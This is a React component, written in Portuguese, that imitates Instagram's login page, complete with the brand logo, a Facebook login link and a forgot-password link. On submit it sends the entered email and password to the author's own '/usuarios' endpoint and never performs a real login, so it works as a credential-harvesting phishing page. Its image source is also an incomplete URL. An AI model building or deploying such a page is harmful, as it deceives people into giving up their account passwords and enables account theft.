import { useRef } from 'react'
import './style.css' 
import api from './api'

function Instagram() {
  const inputEmail = useRef()
  const inputSenha = useRef()

  async function createUsers() {
    if (!inputEmail.current.value || !inputSenha.current.value) {
      alert("Por favor, preencha e-mail e senha.")
      return
    }

    try {
      await api.post('/usuarios', {
        email: inputEmail.current.value,
        senha: inputSenha.current.value
      })

      inputEmail.current.value = ""
      inputSenha.current.value = ""
      alert("Dados enviados com sucesso!")
    } catch (error) {
      console.error("Erro na requisição:", error)
      alert("Erro ao conectar com o servidor.")
    }
  }

  return (
    <div className='container'>
      {/* O onSubmit no form garante que o 'Enter' do teclado também envie os dados */}
      <form onSubmit={(e) => { e.preventDefault(); createUsers(); }}>
        
        <div className="logo-container">
          {/* Logo oficial em formato de texto para melhor aparência */}
          <img 
            src="upload.wikimedia.org" 
            alt="Instagram" 
            style={{ width: '175px', margin: '20px 0 30px 0' }}
          />
        </div>

        <input 
          placeholder="E-mail ou nome de usuário" 
          ref={inputEmail} 
          type="email" 
          required 
        />
        
        <input 
          placeholder="Senha" 
          ref={inputSenha} 
          type="password" 
          required 
        />
        
        <button type='submit'>Entrar</button>

        <div className="separator">
          <span>OU</span>
        </div>

        <a href="#" className="facebook-login">
          <i className="fab fa-facebook-square"></i> Entrar com o Facebook
        </a>

        <a href="#" className="forgot-password">Esqueceu a senha?</a>
      </form>
    </div>
  )
}

export default Instagram